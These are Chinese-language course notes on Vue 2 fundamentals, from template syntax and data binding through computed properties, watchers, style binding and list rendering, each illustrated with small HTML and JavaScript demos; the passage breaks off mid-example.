# **第 1 章：Vue 核心**

## **1.1. Vue 简介**

### **1.1.1. 官网**

- 英文官网: https://vuejs.org/
- 中文官网: https://cn.vuejs.org/

### **1.1.2. 介绍与描述**

​	Vue 是动态构建用户界面的**渐进式** JavaScript 框架

​	作者: 尤雨溪

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307091554451.png"  style="width:100%"/>



### **1.1.3. Vue 的特点**

1. 采用<span style="color:red; font-weight:bolder">组件化</span>模式，提高代码复用率、且让代码更好维护。

2. <span style="color:red; font-weight:bolder">声明式</span>编码，让编码人员无需直接操作DOM，提高开发效率。

   <img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307091606680.png"/>

3. 使用 <span style="color:red;font-weight:bolder">虚拟DOM</span>+优秀的<span style="color:red;font-weight:bolder">Diff算法</span>，尽量复用DOM节点。

   <img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307091611071.png"/>

## **1.2. 初识 Vue**

### 文件结构

> —vue_basic
>
> ​	—01_初识Vue
>
> ​		—初识Vue.html
>
> ​	—js
>
> ​		—vue.js //开发版本
>
> ​		—vue.min.js //生产版本



### 代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>初识Vue</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器 -->
		<div id="demo">
			<h1>Hello，{{name.toUpperCase()}}，{{address}}</h1>
		</div>
		<script type="text/javascript" >
			Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
			//创建Vue实例
			new Vue({
				el:'#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
				data:{ //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
					name:'world',
					address:'北京'
				}
			})
		</script>
	</body>
</html>
```



### 效果

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307091900384.png"/>



### <span style="color:red;font-weight:bolder;font-style: italic;" >总结</span>

> 初识Vue：
>
> ​    1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
>
> ​    2.root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；
>
> ​    3.root容器里的代码被称为【Vue模板】；
>
> ​    4.Vue实例和容器是<span style="color:red;font-weight:bolder;">一一对应的</span>；
>
> ​    5.真实开发中只有一个Vue实例，并且会配合着组件一起使用；
>
> ​    6.{{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；
>
> ​    7.一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；
>
> 
>
> ​    注意区分：js表达式 和 js代码(语句)
>
> ​      1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
>
> ​         (1). a
>
> ​         (2). a+b
>
> ​         (3). demo(1)
>
> ​         (4). x === y ? 'a' : 'b'
>
> 
>
> ​      2.js代码(语句)
>
> ​         (1). if(){}
>
> ​         (2). for(){}

## **1.3. 模板语法**

### **1.3.1.例子**

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307101655451.png"/>

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue模板语法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器 -->
		<div id="root">
			<h1>插值语法</h1>
			<h3>你好，{{name}}</h3>
			<hr>
			<h1>指令语法</h1>
			<a v-bind:href="atguigu.url">去{{atguigu.name}}官网(1)</a><br>
			<a :href="vue.url">去{{vue.name}}官网(2)</a>
			<hr>
		</div>
	</body>
	<script type="text/javascript" >
		Vue.config.productionTip = false 
		new Vue({
			el:"#root",
			data:{
				name:'jack',
				atguigu:{
					name:'尚硅谷',
					url:'http://www.atguigu.com/',
				},
				vue:{
					name:'Vue',
					url:'https://cn.vuejs.org/',
				}
			}
		})
	</script>
</html>
```



### **1.3.2. 模板的理解**

html 中包含了一些 JS 语法代码，语法分为两种，分别为：

1. **插值语法**（双大括号表达式）
2. **指令语法**（以 v-开头）



### **1.3.3. 插值语法**

1. 功能: 用于解析标签体内容
2. 写法：<span style="color:red;font-weight:bolder;">{{xxx}}</span>，xxx是js表达式，且可以直接读取到data中的所有属性



### **1.3.4. 指令语法 v-bind**

1. 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）
2. 举例：`v-bind:href="xxx"` 或  简写为 `:href="xxx"`，xxx同样要写js表达式，且可以直接读取到data中的所有属性。
3. 说明：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子



## **1.4. 数据绑定**

### **1.4.1. 例子**

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307102359157.png"/>

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>数据绑定</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器 -->
		<div id="root">
			单向数据绑定：<input type="text" :value="name"><br>
			双向数据绑定：<input type="text" V-model="name">
		</div>
	</body>
	<script type="text/javascript" >
		Vue.config.productionTip = false 
		new Vue({
			el:'#root',
			data:{
				name:'Vue'
			}
		})
	</script>
</html>
```



### **1.4.2. 单向数据绑定 v-bind**

1. 语法：`v-bind:href ="xxx"` 或简写为 `:href`
2. 特点：数据只能从 data 流向页面



### **1.4.3. 双向数据绑定 v-mode**

1. 语法：`v-mode:value="xxx"` 或简写为 `v-model="xxx"`
2. 特点：数据不仅能从 data 流向页面，还能从页面流向 data



## 1.5.el与data的两种写法

### 1.5.1. el有两种写法

1. new Vue时候配置el属性。

   ```js
   const v = new Vue({
   	el:'#root', //第一种写法
   	data:{
   		name:'尚硅谷'
   	}
   })
   ```

   

2. 先创建Vue实例，随后再通过vm.$mount('#root')指定el的值

   ```
   const vm = new Vue({
   	data:{
   		name:'尚硅谷'
   	}
   })
   vm.$mount('#root')
   ```



### 1.5.2. data的两种写法

1. 对象式

   ```js
   const vm = new Vue({
   	el:'#root',
   	data:{
   		name:'尚硅谷'
   	}
   })
   ```

   

2. 函数式

   ```js
   const vm = new Vue({
   	el:'#root',
   	data(){
       	return{
       		name:'尚硅谷'
       	}
       }
   })
   ```

   

> 1.如何选择：目前哪种写法都可以，以后学习到组件时，<span style="color:red;font-weight:bolder;">data必须使用函数式</span>，否则会报错。
>
> 2.由Vue管理的函数，<span style="color:red;font-weight:bolder;">一定不要写箭头函数</span>，一旦写了箭头函数，this就不再是Vue实例了。



## **1.6. MVVM 模型**

1. M：模型(Model) ：data中的数据
2. V：视图(View) ：模板
3. VM：视图模型(ViewModel)：Vue实例对象

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307102352579.png"/>

> 1.data中所有的属性，最后都出现在了vm身上。
>
> 2.vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。



## 1.7. 数据代理

### 1.7.1. Object.defineProperty方法

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307111621266.png"/>

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>回顾Object.defineproperty方法</title>
	</head>
	<body>
		<script type="text/javascript" >
			let number = 18
			let person = {
				name:'张三',
				sex:'男',
			}

			Object.defineProperty(person,'age',{
				// value:18,
				// enumerable:true, //控制属性是否可以枚举，默认值是false
				// writable:true, //控制属性是否可以被修改，默认值是false
				// configurable:true //控制属性是否可以被删除，默认值是false

				//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
				get(){
					console.log('有人读取age属性了')
					return number
				},
				
				//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
				set(value){
					console.log('有人修改了age属性，且值是',value)
					number = value
				}
			})
            //遍历person对象
			// console.log(Object.keys(person))
			console.log(person)
		</script>
	</body>
</html>
```



### 1.7.2. 何为数据代理

数据代理：通过**一个对象代理**对**另一个对象中属性**的操作（读/写）



*例子*

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>何为数据代理</title>
	</head>
	<body>
		<!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）-->
		<script type="text/javascript" >
			let obj = {x:100}
			let obj2 = {y:200}

			Object.defineProperty(obj2,'x',{
				get(){
					return obj.x
				},
				set(value){
					obj.x = value
				}
			})
		</script>
	</body>
</html>
```



### 1.7.3. Vue中的数据代理

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307111656865.png"/>

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue中的数据代理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>学校名称：{{name}}</h2>
			<h2>学校地址：{{address}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'宏福科技园'
			}
		})
	</script>
</html>
```

> 1.Vue中的数据代理：
>
> ​       通过vm对象来代理data对象中属性的操作（读/写）
>
> ​    2.Vue中数据代理的好处：
>
> ​       更加方便的操作data中的数据
>
> ​    3.基本原理：
>
> ​       通过Object.defineProperty()把data对象中所有属性添加到vm上。
>
> ​       为每一个添加到vm上的属性，都指定一个getter/setter。
>
> ​       在getter/setter内部去操作（读/写）data中对应的属性



## **1.8. 事件处理**

### 1.8.1 例子

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307122127724.png"/>

```html
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>事件的基本使用</title>
	<script src="../js/vue.js"></script>
</head>
<body>
	<div id="root">
		<h1>欢迎，学习{{name}}</h1>
		<button v-on:click="showInfo">点击01</button>
		<button @click="showInfo">点击02</button>
	</div>
</body>
<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		const vm = new Vue({
			el:"#root",
			data(){
				return{
					name:'Vue'
				}
			},
			methods: {
				showInfo(event){
					alert("同学你好!")
				},
			}
		})
</script>
</html>
```



### **1.8.2. 绑定监听 v-on**

1. `v-on:xxx="fun"`
2. `@xxx="fun"`
3. `@xxx="fun(参数)"`
4. **默认事件形参: event**
5. **隐含属性对象: $event**



### **1.8.3. 事件修饰符**

| 事件修饰符 |                       作用                       |
| :--------: | :----------------------------------------------: |
|  prevent   |               阻止默认事件（常用）               |
|    stop    |               阻止事件冒泡（常用）               |
|    once    |              事件只触发一次（常用）              |
|  capture   |                使用事件的捕获模式                |
|    self    |   只有event.target是当前操作的元素时才触发事件   |
|  passive   | 事件的默认行为立即执行，无需等待事件回调执行完毕 |



```html
<!-- 修饰符可以连续写 -->
<!-- 例子 -->
<a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a>
```



### **1.6.4. 按键修饰符**

1. keycode : 操作的是某个 keycode 值的键
2. .keyName : 操作的某个按键名的键(少部分)

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>键盘事件</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
            <input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo">
			<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
            
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods: {
				showInfo(e){
					// console.log(e.key,e.keyCode)
					console.log(e.target.value)
				}
			},
		})
	</script>
</html>
```



> | 1.Vue中常用的按键别名 |                                   |
> | :-------------------- | :-------------------------------- |
> | 回车                  | enter                             |
> | 删除                  | delete (捕获“删除”和“退格”键)     |
> | 退出                  | esc                               |
> | 空格                  | space                             |
> | 换行                  | tab (特殊，必须配合keydown去使用) |
> | 上                    | up                                |
> | 下                    | down                              |
> | 左                    | left                              |
> | 右                    | right                             |
>
> 
>
> **2**.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case<span style="color:red;font-weight:bolder;">（短横线命名）</span>
>
> 
>
> **3**.系统修饰键（用法特殊）：ctrl、alt、shift、meta
>
> ​       (1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
>
> ​       (2).配合keydown使用：正常触发事件。
>
> 
>
> **4**.也可以使用keyCode去指定具体的按键<span style="color:red;font-weight:bolder;">（不推荐）</span>



## **1.9. 计算属性**

### 1.9.1. 例子

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307132056079.png"/>

```html
<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>姓名案例_计算属性实现</title>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<div id="root">
		姓：<input type="text" v-model="firstName"><br><br>
		名：<input type="text" v-model="lastName"><br><br>
		名字：<span>{{fullName}}</span>
	</div>
</body>
<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	const vm = new Vue({
		el: '#root',
		data: {
			firstName:'张',
			lastName:'三',
		},
		computed: {
			fullName:{
				get(){
					return this.firstName + '-' + this.lastName
				},
				set(value){
					console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
				}
			}
		}
	})
</script>

</html>
```



### **1.9.2. 计算属性-computed**

1. 定义：要用的属性不存在，要通过已有属性计算得来。
2. 原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
3. get函数什么时候执行？
   - 初次读取时会执行一次。
   - 当依赖的数据发生改变时会被再次调用。
4. 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
5. 备注：
   - 计算属性最终会出现在vm上，直接读取使用即可。
   - 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。

```js
// 简写
computed:{
    fullName(){
        console.log('get被调用了')
        return this.firstName + '-' + this.lastName
	}
}
//完整写法
computed: {
    fullName:{
        get(){
            return this.firstName + '-' + this.lastName
        },
            set(value){
                console.log('set',value)
                const arr = value.split('-')
                this.firstName = arr[0]
                this.lastName = arr[1]
            }
    }
}
```



## 1.10. 侦听器

### 1.10.1. 例子

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307141843986.png"/>

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_深度监视</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
			<hr/>
			<h3>a的值是:{{numbers.a}}</h3>
			<button @click="numbers.a++">点我让a+1</button>
			<h3>b的值是:{{numbers.b}}</h3>
			<button @click="numbers.b++">点我让b+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
				numbers:{
					a:1,
					b:1
				}
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			watch:{
				isHot:{
					// immediate:true, //初始化时让handler调用一下
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				},
				//监视多级结构中某个属性的变化
				'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				} ,
				//监视多级结构中所有属性的变化
				numbers:{
					deep:true,
					handler(){
						console.log('numbers改变了')
					}
				}
			}
		})
	// vm.$watch('isHot',{
	// 		handler(newValue,oldValue){
	// 			console.log('isHot被修改了',newValue,oldValue)
	// 		}
	// 	})
	</script>
</html>
```



### 1.10.2. 侦听器-computed

1. 当被监视的属性**变化**时, 回调函数**自动调用**, 进行相关操作

2. 监视的属性**必须存在**，才能进行监视！！

3. 监视的两种写法：

   1. new Vue时传入watch配置

      ```js
      watch:{
          isHot:{
              handler(newValue,oldValue){
                  console.log('isHot被修改了',newValue,oldValue)
              }
          }
      }
      ```

   2. 通过vm.$watch监视

      ```js
      vm.$watch('isHot',{
          handler(newValue,oldValue){
          	console.log('isHot被修改了',newValue,oldValue)
      	}
      })
      ```

4. ```js
   //简写
   //第1种
   watch:{
       isHot(newValue,oldValue){
           console.log('isHot被修改了',newValue,oldValue,this)
       }
   }
   //第2种
   vm.$watch('isHot',(newValue,oldValue)=>{
       console.log('isHot被修改了',newValue,oldValue,this)
   })
   ```

   

### 1.10.3. 深度监视

1. Vue中的watc**h默认不监测对象内部值的改变**（一层）
2. 配置`deep:true`可以监测对象内部值改变（多层）

> (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
>
> (2).使用watch时根据数据的具体结构，决定是否采用深度监视。



### 1.10.4 computed和watch之间的区别

1. computed能完成的功能，watch都可以完成。
2. watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。

> **两个重要的小原则：**
>
> ​	1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
>
> ​	2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。



## 1.11.**class 与 style 绑定**

### 1.11.1. **理解**

1. 在应用界面中, 某个(些)元素的样式是变化的
2. class/style 绑定就是专门用来实现动态样式效果的技术



### 1.11.2. **class 绑定**

写法:`class="xxx"` xxx可以是字符串、对象、数组。

1. 字符串写法适用于：类名不确定，要动态获取。
2. 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
3. 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>绑定样式</title>
		<style>
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
			
			.happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
			}
			.sad{
				border: 4px dashed rgb(2, 197, 2);
				background-color: gray;
			}
			.normal{
				background-color: skyblue;
			}

			.atguigu1{
				background-color: yellowgreen;
			}
			.atguigu2{
				font-size: 30px;
				text-shadow:2px 2px 10px red;
			}
			.atguigu3{
				border-radius: 20px;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
			<div class="basic" :class="mood" @click="changeMood">{{name}}</div><br/><br/>
			<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
			<div class="basic" :class="classArr">{{name}}</div><br/><br/>
			<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
			<div class="basic" :class="classObj">{{name}}</div><br/><br/>
		</div>
	</body>
	<script type="text/javascript">
		Vue.config.productionTip = false
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
                //字符串写法
				mood:'normal',
                //数组写法
				classArr:['atguigu1','atguigu2','atguigu3'],
                //对象写法
				classObj:{
					atguigu1:false,
					atguigu2:false,
				},
			},
			methods: {
				changeMood(){
					const arr = ['happy','sad','normal']
					const index = Math.floor(Math.random()*3)
					this.mood = arr[index]
				}
			},
		})
	</script>
	
</html>
```



### 1.11.3. **style 绑定**

1. `:style="{fontSize: xxx}"`其中xxx是动态值。
2. `:style="[a,b]"`其中a、b是样式对象。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>绑定样式</title>
		<style>
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
			
			.happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
			}
			.sad{
				border: 4px dashed rgb(2, 197, 2);
				background-color: gray;
			}
			.normal{
				background-color: skyblue;
			}

			.atguigu1{
				background-color: yellowgreen;
			}
			.atguigu2{
				font-size: 30px;
				text-shadow:2px 2px 10px red;
			}
			.atguigu3{
				border-radius: 20px;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 绑定style样式--对象写法 -->
			<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
			<!-- 绑定style样式--数组写法 -->
			<div class="basic" :style="styleArr">{{name}}</div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
                //对象写法
				styleObj:{
					fontSize: '40px',
					color:'red',
				},
				styleObj2:{
					backgroundColor:'orange'
				},
                //数组写法
				styleArr:[
					{
						fontSize: '40px',
						color:'blue',
					},
					{
						backgroundColor:'gray'
					}
				]
			},
		})
	</script>
</html>
```



## 1.12. 条件渲染

### 1.12.1. v-show

1. 写法：`v-show="表达式"`
2. 适用于：切换频率较高的场景
3. 特点：不展示的DOM元素未被移除，仅仅是使用**样式隐藏**掉



### 1.12.2. v-if

1. 写法：
   - `v-if="表达式`" 
   - `v-else-if="表达式"`
   - `v-else="表达式"`
2.  适用于：切换频率较低的场景。
3. 特点：不展示的DOM元素**直接被移除**。
4. 注意：v-if可以和:v-else-if、v-else一起使用，但**要求结构不能被“打断”**。

> 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。



### 1.12.3. vue中的template

- **template标签在vue实例绑定的元素内部**，它是**可以显示**template标签中的内容，但是查看后台的dom结构**不存在**template标签。
- 如果**template标签不放在vue实例绑定的元素内部**，默认里面的内容**不能显示**在页面上，但是查看后台dom结构**存在**template标签。

> 注意：vue实例绑定的元素内部的template标签不支持v-show指令，即v-show="false"对template标签来说不起作用。但是此时的template标签支持v-if、v-else-if、v-else、v-for这些指令。



### 1.12.4. 例子

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>条件渲染</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
			<!-- 使用v-show做条件渲染 -->
			<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- 使用v-if做条件渲染 -->
			<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- v-else和v-else-if -->
			<!-- <div v-if="n === 1">Angular</div>
			<div v-else-if="n === 2">React</div>
			<div v-else-if="n === 3">Vue</div>
			<div v-else>哈哈</div> -->

			<!-- v-if与template的配合使用 -->
			<template v-if="n === 1">
				<h2>你好</h2>
				<h2>尚硅谷</h2>
				<h2>北京</h2>
			</template>

		</div>
	</body>
	<script type="text/javascript">
		Vue.config.productionTip = false
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:0
			}
		})
	</script>
</html>
```



## 1.13.**列表渲染**

### 1.13.1 例子

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307152324871.png"/>

```html
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title></title>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	<div id="root">
		<!-- 遍历数组 -->
		<h2>人员列表(遍历数组)</h2>
		<ul>
			<li v-for="(p,index) in persons" :key="p.id">
				{{p.name}} - {{p.age}} - {{index}}
			</li>
		</ul>
		<hr>

		<!-- 遍历对象 -->
		<h2>汽车列表(遍历对象)</h2>
		<ul>
			<li v-for="(value,k) in car" :key="k">
				{{index}} : {{value}}
			</li>
		</ul>
		<hr>

		<!-- 遍历字符串 -->
		<h2>遍历字符串{{str}}（用得少）</h2>
		<ul>
			<li v-for="(char,index) of str" :key="index">
				{{char}}-{{index}}
			</li>
		</ul>
		<hr>

		<!-- 遍历指定次数 -->
		<h2>测试遍历指定次数（用得少）</h2>
			<ul>
				<li v-for="(number,index) of 5" :key="index">
					{{index}}-{{number}}
				</li>
			</ul>
		</div>
	</div>
</body>
<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
	new Vue({
		el: '#root',
		data: {
			persons:[
				{id:'001',name:'张三',age:18},
				{id:'002',name:'李四',age:19},
				{id:'003',name:'王五',age:20}
			],
			car:{
				name:'法拉利',
				color:'黑色',
				price:'70万',
			},
			str:'hello'
		},
	})
</script>
</html>
```



### 1.13.2. v-for

1. 用于展示列表数据
2. 语法：`v-for="(item, index) in xxx" :key="yyy"`
3. 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）



### 1.13.3. key的原理

1. 虚拟DOM中key的作用：

   ​	key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

2. 对比规则：

   1. 旧虚拟DOM中找到了与新虚拟DOM相同的key：
      - 若虚拟DOM中内容<span style="color:red;font-weight:bolder">没变</span>, 直接<span style="color:red;font-weight:bolder">使用之前的真实DOM！</span>
      - 若虚拟DOM中内容<span style="color:red;font-weight:bolder">变了</span>, 则<span style="color:red;font-weight:bolder">生成新的真实DOM</span>，随后替换掉页面中之前的真实DOM。
   2. 旧虚拟DOM中未找到与新虚拟DOM相同的key
      - <span style="color:red;font-weight:bolder">创建新的真实DOM</span>，随后渲染到到页面。

3. 用index作为key可能会引发的问题：

   1. 若对数据进行：<span style="color:red;font-weight:bolder">逆序添加、逆序删除等破坏顺序操作</span>:
      - 会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
   2. 如果结构中还包含<span style="color:red;font-weight:bolder">输入类的DOM</span>：
      - 会产生错误DOM更新 ==> 界面有问题。

4. 开发中如何选择key?:

   1. 最好<span style="color:red;font-weight:bolder">使用每条数据的唯一标识作为key</span>, 比如id、手机号、身份证号、学号等唯一值。
   2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，<span style="color:red;font-weight:bolder">仅用于渲染列表用于展示，使用index作为key是没有问题的。</span>

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307152344216.png"/>

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202307152344768.png"/>

## 1.14. Vue监视数据

1. vue会监视data中所有层次的数据。

2. 如何监测对象中的数据？

   ```
   通过setter实现监视，且要在new Vue时就传入要监测的数据。
   (1).对象中后追加的属性，Vue默认不做响应式处理
   (2).如需给后添加的属性做响应式，请使用如下API：
           Vue.set(target，propertyName/index，value) 或 
           vm.$set(target，propertyName/index，value)
   ```

3. 如何监测数组中的数据？

   ```
   通过包裹数组更新元素的方法实现，本质就是做了两件事：
   (1).调用原生对应的方法对数组进行更新。
   (2).重新解析模板，进而更新页面。
   ```

4. 在Vue修改数组中的某个元素一定要用如下方法：

   ```
   1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
   2.Vue.set() 或 vm.$set()
   ```

<span style="color:red;font-weight:bolder">特别注意：</span>Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！



```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>总结数据监视</title>
		<style>
			button{
				margin-top: 10px;
			}
		</style>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学生信息</h1>
			<button @click="student.age++">年龄+1岁</button> <br/>
			<button @click="addSex">添加性别属性，默认值：男</button> <br/>
			<button @click="student.sex = '未知' ">修改性别</button> <br/>
			<button @click="addFriend">在列表首位添加一个朋友</button> <br/>
			<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
			<button @click="addHobby">添加一个爱好</button> <br/>
			<button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
			<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
			<h3>姓名：{{student.name}}</h3>
			<h3>年龄：{{student.age}}</h3>
			<h3 v-if="student.sex">性别：{{student.sex}}</h3>
			<h3>爱好：</h3>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h3>朋友们：</h3>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>
	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		const vm = new Vue({
			el:'#root',
			data:{
				student:{
					name:'tom',
					age:18,
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				},
				addFriend(){
					this.student.friends.unshift({name:'jack',age:70})
				},
				updateFirstFriendName(){
					this.student.friends[0].name = '张三'
				},
				addHobby(){
					this.student.hobby.push('学习')
				},
				updateHobby(){
					// this.student.hobby.splice(0,1,'开车')
					// Vue.set(this.student.hobby,0,'开车')
